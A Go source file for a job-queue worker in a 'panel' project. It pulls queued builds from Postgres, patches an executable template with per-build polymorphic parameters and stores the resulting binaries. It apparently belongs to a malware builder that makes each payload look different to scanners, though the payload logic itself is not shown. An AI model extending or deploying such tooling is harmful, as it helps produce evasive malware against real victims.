package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"log/slog"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"zialfi-panel/internal/builder"
	"zialfi-panel/internal/services"
)

func main() {
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelInfo}))
	slog.SetDefault(logger)

	dbURL := os.Getenv("DATABASE_URL")
	if dbURL == "" {
		dbURL = "postgres://mirage:mirage@localhost:5432/mirage?sslmode=disable"
	}
	pool, err := pgxpool.New(context.Background(), dbURL)
	if err != nil {
		slog.Error("db connect failed", "error", err)
		os.Exit(1)
	}
	defer pool.Close()

	templatePath := os.Getenv("TEMPLATE_PATH")
	if templatePath == "" {
		templatePath = "/data/mirage_template.exe"
	}
	template, err := os.ReadFile(templatePath)
	if err != nil {
		slog.Error("template load failed", "path", templatePath, "error", err)
		os.Exit(1)
	}

	engine := &builder.Engine{Template: template}
	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	slog.Info("builder worker started", "template_size", len(template))

	for {
		select {
		case <-ctx.Done():
			slog.Info("shutting down")
			return
		default:
		}

		job, err := claimJob(ctx, pool)
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		if job == nil {
			time.Sleep(1 * time.Second)
			continue
		}

		slog.Info("building", "build_id", job.ID, "name", job.Config.BuildName)
		pc, _ := builder.GeneratePoly(0)
		result, err := engine.Build(job.Config, pc)
		if err != nil {
			slog.Error("build failed", "build_id", job.ID, "error", err)
			markFailed(ctx, pool, job.ID, err.Error())
			continue
		}

		if err := storeResult(ctx, pool, job.ID, result); err != nil {
			slog.Error("store failed", "build_id", job.ID, "error", err)
			continue
		}
		slog.Info("build complete", "build_id", job.ID, "sha256", result.SHA256[:16], "size", result.Size)
	}
}

type job struct {
	ID     string
	Config services.BuildConfig
}

func claimJob(ctx context.Context, pool *pgxpool.Pool) (*job, error) {
	row := pool.QueryRow(ctx, `
		UPDATE builds SET status = 'building', updated_at = NOW()
		WHERE id = (
			SELECT id FROM builds WHERE status = 'queued'
			ORDER BY created_at ASC LIMIT 1
			FOR UPDATE SKIP LOCKED
		)
		RETURNING id, config_hash
	`)
	var j job
	var ch string
	if err := row.Scan(&j.ID, &ch); err != nil {
		return nil, nil
	}
	j.Config = services.BuildConfig{BuildName: "build-" + j.ID[:8]}
	return &j, nil
}

func storeResult(ctx context.Context, pool *pgxpool.Pool, buildID string, result builder.BuildResult) error {
	_, err := pool.Exec(ctx, `
		UPDATE builds SET status='done', file_data=$1, file_size=$2, sha256=$3, updated_at=NOW()
		WHERE id=$4`, result.Data, result.Size, result.SHA256, buildID)
	return err
}

func markFailed(ctx context.Context, pool *pgxpool.Pool, buildID, msg string) {
	pool.Exec(ctx, "UPDATE builds SET status='failed', error_message=$1, updated_at=NOW() WHERE id=$2", msg, buildID)
}

var _, _ = sha256.Sum256, hex.EncodeToString
var _ = json.Marshal
